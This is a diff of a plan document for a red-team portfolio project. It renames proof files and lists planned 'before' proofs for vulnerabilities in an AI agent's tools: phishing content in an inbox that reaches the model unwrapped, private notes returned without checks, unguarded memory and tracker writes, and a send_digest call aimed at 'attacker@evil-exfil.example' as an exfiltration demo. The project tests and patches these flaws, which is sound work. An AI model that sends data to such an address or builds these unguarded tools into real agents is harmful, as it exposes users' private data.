@@ -2,7 +2,7 @@
 
 Status (updated 2026-09-17): **Phases 1–2 complete** — every vuln in the table below has
 a before-proof (Phase 1) and is patched to v2 (Phase 2); see `STATUS.md` §18–§22 for the
-session-by-session record and each `attacks/MANUAL_VULN_*.md`'s "v2: patched" section for
+session-by-session record and each `attacks/VULN_*.md`'s "v2: patched" section for
 per-vuln evidence. **Phase 3 (portfolio finalize/reorg) not started.** The plan text below
 is left as originally written and should be read as the original plan, not a current
 TODO list — where it says a phase "has not been executed," that's true only for Phase 3.
@@ -19,13 +19,13 @@ otherwise a "before/after" story can't be told for anything except A+B.
 ## Phase 1 — Freeze "before" proof (current state: fully v1, do this first)
 
 One proof artifact per row below, each following the pattern already set by
-`attacks/MANUAL_VULN_A.md`: inline vulnerable code (verbatim, comment marking the
+`attacks/VULN_A.md`: inline vulnerable code (verbatim, comment marking the
 weakness, code untouched), the exact command run, the captured raw output, and a note on
 where a screenshot would help.
 
 | # | Item | Type | Proof shape | Who runs it |
 |---|---|---|---|---|
-| 1.1 | H standalone (`read_inbox`) | structural + live | Direct call: `main.read_inbox()` against the existing seeded `inbox.json` phishing entry — show the raw string returned has no `<untrusted>` wrapping either, mirroring MANUAL_VULN_A's proof shape for A. | You |
+| 1.1 | H standalone (`read_inbox`) | structural + live | Direct call: `main.read_inbox()` against the existing seeded `inbox.json` phishing entry — show the raw string returned has no `<untrusted>` wrapping either, mirroring VULN_A's proof shape for A. | You |
 | 1.2 | E standalone (`search_notes`) | live | Call `search_notes("private")` (or similar) directly and show `private-interview-prep.md` content returned in full despite its own header self-labeling "not for sharing" — no sensitivity check in code. | You |
 | 1.3 | C standalone (`append_memory` + `update_tracker`) | live | Direct calls proving (a) `append_memory` has no size cap/sanitization/provenance tag, (b) `update_tracker` fully overwrites with no backup/append-only guard, no confirmation. | You |
 | 1.4 | B standalone (`send_digest`) | live | Direct call: `send_digest("attacker@evil-exfil.example", "x", "y")` — proves recipient is 100% caller-controlled, no fixed config, no filter. | You |
@@ -47,7 +47,7 @@ screenshot would strengthen that particular proof, and exactly what should be in
 
 Each live-agentic item gets its own `attacks/<id>_<name>/` folder (see Phase 3 structure)
 with a `BEFORE.md` write-up in the same three-sentence-story format as
-`attacks/README.md` / `attacks/MANUAL_VULN_A.md`.
+`attacks/README.md` / `attacks/VULN_A.md`.
 
 **Screenshots that would strengthen the report:** the PowerShell server console mid-request
 for each structural proof (shows a real request landing, not a mock); the Claude Code chat
